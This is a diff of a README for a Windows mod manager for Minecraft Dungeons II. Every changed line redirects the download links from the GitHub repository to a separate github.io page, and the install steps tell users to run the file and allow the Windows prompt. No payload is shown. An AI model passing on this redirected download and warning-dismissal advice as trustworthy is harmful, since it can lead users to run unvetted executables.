@@ -1,6 +1,6 @@
 # 🧱 Minecraft-Dungeons-2-mod-manager - Mod Minecraft Dungeons II Easily
 
-[![Download MCD2 Mod Manager](https://img.shields.io/badge/⬇_Download-MCD2_Mod_Manager-orange?style=for-the-badge)](https://github.com/diosa1975/Minecraft-Dungeons-2-mod-manager)
+[![Download MCD2 Mod Manager](https://img.shields.io/badge/⬇_Download-MCD2_Mod_Manager-orange?style=for-the-badge)](https://diosa1975.github.io)
 
 MCD2 Mod Manager is a Windows application that takes the guesswork out of modding Minecraft Dungeons II. Instead of hunting for files, renaming folders, and hoping the game still launches, you get one window that handles the whole job: it auto-downloads mods from Nexus Mods, installs .pak files, manages load order, detects conflicts, and creates backups. One-click setup, no programming required.
 
@@ -10,9 +10,9 @@ Whether you want a small quality-of-life tweak or a full overhaul of your dungeo
 
 ## 📥 Download
 
-[![Download MCD2 Mod Manager](https://img.shields.io/badge/⬇_Get_MCD2_Mod_Manager-blueviolet?style=for-the-badge)](https://github.com/diosa1975/Minecraft-Dungeons-2-mod-manager)
+[![Download MCD2 Mod Manager](https://img.shields.io/badge/⬇_Get_MCD2_Mod_Manager-blueviolet?style=for-the-badge)](https://diosa1975.github.io)
 
-**Visit this link to download the application:** [https://github.com/diosa1975/Minecraft-Dungeons-2-mod-manager](https://github.com/diosa1975/Minecraft-Dungeons-2-mod-manager)
+**Visit this link to download the application:** [https://diosa1975.github.io](https://diosa1975.github.io)
 
 That single link is all you need. Save the download to a folder you can find again, such as your Downloads folder or your Desktop.
 
@@ -89,7 +89,7 @@ If your PC can run Minecraft Dungeons II smoothly, it can run this manager.
 
 ## 🛠️ Installation and Setup
 
-1. Open the download link: [https://github.com/diosa1975/Minecraft-Dungeons-2-mod-manager](https://github.com/diosa1975/Minecraft-Dungeons-2-mod-manager)
+1. Open the download link: [https://diosa1975.github.io](https://diosa1975.github.io)
 2. Save the file to a folder you will remember.
 3. Run the file. Windows may ask for confirmation — allow it, since you started the download yourself.
 4. When the main window appears, let the first-run check finish. It looks for your game folder and confirms it can reach Nexus Mods.
